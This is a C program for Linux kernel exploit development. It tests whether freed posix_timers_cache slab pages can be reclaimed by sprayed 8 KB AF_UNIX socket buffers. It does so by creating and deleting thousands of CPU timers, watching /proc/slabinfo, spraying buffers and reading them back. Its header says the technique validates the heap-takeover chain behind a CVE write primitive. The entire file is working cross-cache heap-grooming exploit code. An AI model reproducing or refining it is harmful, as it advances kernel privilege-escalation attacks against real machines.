/*
 * reclaim_test.c - does an 8 KB AF_UNIX skb page actually take over an
 * order-1 slab page that posix_timers_cache released to the buddy allocator?
 *
 * This deliberately does NOT use the CVE. It only validates the reclaim chain
 * that the write primitive depends on:
 *
 *   create M cpu timers -> delete them all -> wait for the cache to drain
 *   -> spray N 8 KB frags -> create M timers again -> read the frags back
 *
 * If any frag page comes back modified, the kernel allocated new k_itimer
 * objects out of memory we still own as skb data => whole-page takeover works.
 *
 * usage: reclaim_test <timers> <frags>
 */
#define _GNU_SOURCE
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/resource.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <time.h>
#include <unistd.h>

#ifndef SYS_timer_create
#define SYS_timer_create 107
#endif
#ifndef SYS_timer_settime
#define SYS_timer_settime 110
#endif
#ifndef SYS_timer_delete
#define SYS_timer_delete 111
#endif

#define CLK_PROC_CPU 2
#define MAXT         20000
#define MAXF         20000
#define FRAG         8192UL

static int g_tids[MAXT];
static int g_ring[MAXF];

static int slab_info(int *a, int *t)
{
    FILE *f = fopen("/proc/slabinfo", "re");
    char l[256];
    if (!f) return -1;
    while (fgets(l, sizeof l, f))
        if (sscanf(l, "posix_timers_cache %d %d", a, t) == 2) { fclose(f); return 0; }
    fclose(f);
    return -1;
}

static long long now_ms(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (long long)ts.tv_sec * 1000 + ts.tv_nsec / 1000000;
}

static int make_timers(int n)
{
    struct sigevent ev;
    struct itimerspec its;
    int made = 0;
    memset(&ev, 0, sizeof ev);
    ev.sigev_notify = SIGEV_SIGNAL;
    ev.sigev_signo = SIGUSR1;
    memset(&its, 0, sizeof its);
    its.it_value.tv_sec = 3600;
    for (int i = 0; i < n; i++) {
        int id = -1;
        if (syscall(SYS_timer_create, CLK_PROC_CPU, &ev, &id) != 0) break;
        syscall(SYS_timer_settime, id, 0, &its, NULL);
        g_tids[made++] = id;
    }
    return made;
}

int main(int argc, char **argv)
{
    int M = argc > 1 ? atoi(argv[1]) : 8000;
    int N = argc > 2 ? atoi(argv[2]) : 8000;
    if (M > MAXT) M = MAXT;
    if (N > MAXF) N = MAXF;
    signal(SIGUSR1, SIG_IGN);

    struct rlimit rl;
    if (getrlimit(RLIMIT_NOFILE, &rl) == 0 && rl.rlim_cur < rl.rlim_max) {
        rl.rlim_cur = rl.rlim_max;
        setrlimit(RLIMIT_NOFILE, &rl);
    }

    int ba = -1, bt = -1, a, t;
    slab_info(&ba, &bt);
    printf("baseline %d/%d\n", ba, bt);

    int made = make_timers(M);
    printf("created %d timers\n", made);
    for (int i = 0; i < made; i++)
        syscall(SYS_timer_delete, g_tids[i]);
    printf("deleted all\n");

    long long t0 = now_ms();
    int drained = 0;
    while (now_ms() - t0 < 5000) {
        slab_info(&a, &t);
        if (ba > 0 && a <= ba + 64 && t <= bt + 64) { drained = 1; break; }
        usleep(20000);
    }
    slab_info(&a, &t);
    printf("after delete: %d/%d drained=%d in %lld ms\n", a, t, drained, now_ms() - t0);

    /* spray 8 KB frags */
    unsigned char *buf = malloc(FRAG);
    memset(buf, 0x41, FRAG);
    int nf = 0;
    for (int i = 0; i < N; i++) {
        int sv[2];
        if (socketpair(AF_UNIX, SOCK_STREAM | SOCK_CLOEXEC, 0, sv) != 0) break;
        if (send(sv[0], buf, FRAG, MSG_NOSIGNAL) != (ssize_t)FRAG) {
            close(sv[0]); close(sv[1]); break;
        }
        close(sv[0]);
        g_ring[nf++] = sv[1];
    }
    printf("sprayed %d frags (%.1f MB)\n", nf, nf * 8.0 / 1024.0);

    /* now make the kernel allocate k_itimer objects again */
    int made2 = make_timers(M);
    slab_info(&a, &t);
    printf("re-created %d timers, cache %d/%d\n", made2, a, t);

    /* read the frag pages back */
    int bad = 0;
    for (int i = 0; i < nf && bad < 8; i++) {
        unsigned char *back = malloc(FRAG);
        ssize_t n = recv(g_ring[i], back, FRAG, MSG_DONTWAIT);
        if (n != (ssize_t)FRAG) { free(back); continue; }
        for (size_t off = 0; off + 8 <= FRAG; off += 8) {
            unsigned long long v;
            memcpy(&v, back + off, 8);
            if (v == 0x4141414141414141ULL) continue;
            printf("TAKEOVER frag=%d off=%#zx val=%#llx\n", i, off, v);
            bad++;
            break;
        }
        free(back);
    }
    printf("RESULT takeovers=%d  (%s)\n", bad, bad ? "RECLAIM WORKS" : "no takeover");

    for (int i = 0; i < nf; i++) close(g_ring[i]);
    for (int i = 0; i < made2; i++) syscall(SYS_timer_delete, g_tids[i]);
    return 0;
}
